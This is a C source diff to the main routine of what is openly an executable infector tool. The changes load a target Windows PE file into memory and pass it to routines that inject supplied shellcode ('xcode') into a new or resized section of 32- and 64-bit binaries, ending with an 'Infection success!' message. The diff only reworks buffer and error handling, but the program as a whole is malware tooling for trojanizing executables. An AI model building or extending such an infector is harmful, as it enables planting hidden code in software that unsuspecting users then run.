@@ -63,6 +63,18 @@ int main(int argc, char** argv) {
 	if (ntHeader64.nt_magic) { //if ntHeader64 filled
 		mode = MODE_64BIT;
 	}
+
+	//read file data to dynamic array
+	fseek(f, 0, SEEK_END);
+	uint32_t file_size = ftell(f);
+	char* file_data = (char*)malloc(file_size);
+
+	if (!file_data) {
+		return -8;
+	}
+
+	rewind(f);
+	fread(file_data, file_size, 1, f);
 	
 	list_pe_section_t sections = NULL;
 	char* dosOriginalGap = NULL; //bytes between end of dos header and PE signature
@@ -92,7 +104,7 @@ int main(int argc, char** argv) {
 			fprintf(stdout, "ImageBase: 0x%08X\n", ntHeader.nt_optional_header.image_base);
 			fprintf(stdout, "File alignment: 0x%08X\n", ntHeader.nt_optional_header.file_alignment);
 			
-			sections = pe_parse_sections(f, &dosHeader, &ntHeader);
+			sections = pe_parse_sections(file_data, &dosHeader, &ntHeader);
 			sectEndOffset = dosHeader.e_lfanew + ntHeader.nt_file_header.size_of_optional_header + sizeof(pe_file_header) + sizeof(uint32_t) + 
 																		ntHeader.nt_file_header.number_of_sections * sizeof(pe_section_header);
 			break;
@@ -103,7 +115,7 @@ int main(int argc, char** argv) {
 			fprintf(stdout, "ImageBase: 0x%016lX\n", ntHeader64.nt_optional_header.image_base);
 			fprintf(stdout, "File alignment: 0x%08X\n", ntHeader64.nt_optional_header.file_alignment);
 			
-			sections = pe64_parse_sections(f, &dosHeader, &ntHeader64);
+			sections = pe64_parse_sections(file_data, &dosHeader, &ntHeader64);
 			sectEndOffset = dosHeader.e_lfanew + ntHeader64.nt_file_header.size_of_optional_header + sizeof(pe_file_header) + sizeof(uint32_t) + 
 																		ntHeader64.nt_file_header.number_of_sections * sizeof(pe_section_header);
 			break;
@@ -185,19 +197,19 @@ int main(int argc, char** argv) {
 						fprintf(stderr, "Not enough space in section header for new section record\n");
 						err = -10;
 					} else {
-						err = pe_infect_new_section(&ntHeader, sections, xcode, xcode_size, strlen(section_name) ? section_name : ".code", thread_flag);
+						err = pe_infect_new_section(&ntHeader, &file_data, &file_size, sections, xcode, xcode_size, strlen(section_name) ? section_name : ".code", thread_flag);
 						if (!err) {
 							sectOriginalGapSize -= sizeof(pe_section_header); //decrease section gap
 						}
 					}
 					break;
 				case METHOD_CODE_RESIZE:
-					err = pe_infect_resize_section(&ntHeader, sections, xcode, xcode_size, thread_flag);
+					err = pe_infect_resize_section(&ntHeader, &file_data, &file_size, sections, xcode, xcode_size, thread_flag);
 					break;
 			}
 			
 			if (!err) {
-				err = pe_write(out_f, &dosHeader, &ntHeader, sections, dosOriginalGap, dosOriginalGapSize, sectOriginalGap, sectOriginalGapSize);
+				err = pe_write(out_f, file_data, file_size, &dosHeader, &ntHeader, sections, dosOriginalGap, dosOriginalGapSize, sectOriginalGap, sectOriginalGapSize);
 			}
 			break;
 		case MODE_64BIT:
@@ -210,19 +222,19 @@ int main(int argc, char** argv) {
 						fprintf(stderr, "Not enough space in section header for new section record\n");
 						err = -10;
 					} else {
-						err = pe64_infect_new_section(&ntHeader64, sections, xcode, xcode_size, strlen(section_name) ? section_name : ".code", thread_flag);
+						err = pe64_infect_new_section(&ntHeader64, &file_data, &file_size, sections, xcode, xcode_size, strlen(section_name) ? section_name : ".code", thread_flag);
 						if (!err) {
 							sectOriginalGapSize -= sizeof(pe_section_header); //decrease section gap
 						}
 					}
 					break;
 				case METHOD_CODE_RESIZE:
-					err = pe64_infect_resize_section(&ntHeader64, sections, xcode, xcode_size, thread_flag);
+					err = pe64_infect_resize_section(&ntHeader64, &file_data, &file_size, sections, xcode, xcode_size, thread_flag);
 					break;
 			}
 			
 			if (!err) {
-				err = pe64_write(out_f, &dosHeader, &ntHeader64, sections, dosOriginalGap, dosOriginalGapSize, sectOriginalGap, sectOriginalGapSize);
+				err = pe64_write(out_f, file_data, file_size, &dosHeader, &ntHeader64, sections, dosOriginalGap, dosOriginalGapSize, sectOriginalGap, sectOriginalGapSize);
 			}
 			break;
 	}
@@ -231,12 +243,14 @@ int main(int argc, char** argv) {
 		fprintf(stdout, "Infection success!\n");
 	} else {
 		fprintf(stderr, "Infection error %d\n", err);
+		free(file_data);
 		fclose(f);
 		fclose(out_f);
 		
-		return -8;
+		return -9;
 	}	
 	
+	free(file_data);
 	fclose(f);
 	fclose(out_f);
 	return 0;
